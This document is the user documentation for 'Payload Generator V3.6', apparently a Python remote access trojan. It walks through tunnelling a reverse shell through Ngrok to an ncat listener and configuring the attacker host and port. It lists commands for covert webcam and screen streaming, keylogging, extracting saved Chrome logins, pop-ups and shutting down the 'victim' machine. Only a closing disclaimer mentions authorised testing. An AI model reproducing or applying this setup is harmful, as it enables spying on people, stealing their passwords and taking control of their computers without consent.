### **Documentation for Payload Generator V3.6 by PhantomCode**

#### **Purpose:**
This payload allows you to remotely control a target's machine using a reverse shell, enabling webcam streaming, screen sharing, keylogging, and system actions like locking the screen or shutting down the device. It uses Ngrok to create a tunnel to bypass NAT/firewalls and ncat for the TCP connection.

---

### **Setup Instructions**

### **Requirements**

Before running the payload, ensure that the following Python modules are installed:

```bash
pip install socket subprocess os time ctypes random pickle opencv-python numpy threading struct pyautogui re json base64 pynput sqlite3 pycryptodome
```

Additionally, ensure that **`win32crypt`** is available (this should be included in the **pywin32** package) and that **`Game`** module is implemented for game functionality.

Install **pywin32** if needed:
```bash
pip install pywin32
```

#### **Step 1: Set Up Ngrok**
1. Download Ngrok and run the following command to create a tunnel for port **8080**:
   ```bash
   ngrok tcp 8080
   ```
2. Ngrok will provide you with a forwarding URL and a TCP address (something like `tcp://0.tcp.ngrok.io:xxxxx`).
   
3. **Important:** Note the TCP address (replace `xxxxx` with the actual port number given by Ngrok).

#### **Step 2: Run Ncat to Listen**
You need to listen for incoming connections on the same port Ngrok is forwarding. Run the following command:
```bash
ncat -lvnp 8080
```
or
```bash
nc -lvnp 8080
```

#### **Step 3: Execute the Payload**
1. Open the **Payload_generator_V-3.6.py** file and edit the necessary variables:
   - **Attacker IP**: This should be the IP from the Ngrok TCP connection (`0.tcp.ngrok.io`).
   - **Attacker Port**: Use the port given by Ngrok (e.g., `xxxxx`).

2. Once you’ve updated these details, run the Python script:
   ```bash
   python Payload_generator_V-3.6.py
   ```

3. After the reverse shell is established, you can run commands directly through your ncat listener.

---

### **Commands Available in the Payload**

| Command               | Description                                                   |
|-----------------------|---------------------------------------------------------------|
| `webcam`              | Starts the webcam server. Requires running the **Main.py** file for GUI. |
| `screenshot`          | Starts screen sharing. Also requires **Main.py** for the GUI. |
| `lockscreen`          | Locks the target's screen.                                    |
| `popups`              | Annoys the victim with pop-up windows.                        |
| `shutdown`            | Shuts down the target’s device.                               |
| `reboot`              | Reboots the target’s device.                                  |
| `extract_google_logins`| Extracts saved Google Chrome logins (username and password).  |
| `stop_webcam`         | Stops webcam streaming.                                       |
| `stop_screenshot`     | Stops screen sharing.                                         |
| `keylogs`             | Displays logged keystrokes.                                   |
| `start_keylogger`     | Starts the keylogger on the target machine.                   |

---

### **Main.py for GUI (Screenshare & Webcam)**
1. To view the victim’s screen or webcam in real-time, after starting the reverse shell, run the `Main.py` file.
2. It will open a GUI that displays the streaming data (webcam/screen).

---

### **Troubleshooting**
- **Connection Issues**: If Ngrok disconnects or ncat closes, simply reopen the listener with the same command and restart the payload using the **Main.py** file for webcam and screen sharing.
- **Command Errors**: If a custom command doesn’t execute, check the Python script to ensure all necessary modules are installed (`cv2`, `pynput`, etc.).

This setup allows for powerful remote control using Ngrok and ncat, with real-time screen sharing and more.

### **Author and Legal Information**

- **Author**: PhantomCode
- **Version**: 3.6
- **Project**: Reverse Shell Payload Generator

#### **Legal Disclaimer**:
This tool is intended for educational and authorized testing purposes only. The author is not responsible for any misuse or damage caused by this tool. Unauthorized use, including but not limited to, accessing computers or networks without permission, is illegal and punishable by law. Always ensure you have explicit permission from the system's owner before conducting any tests.

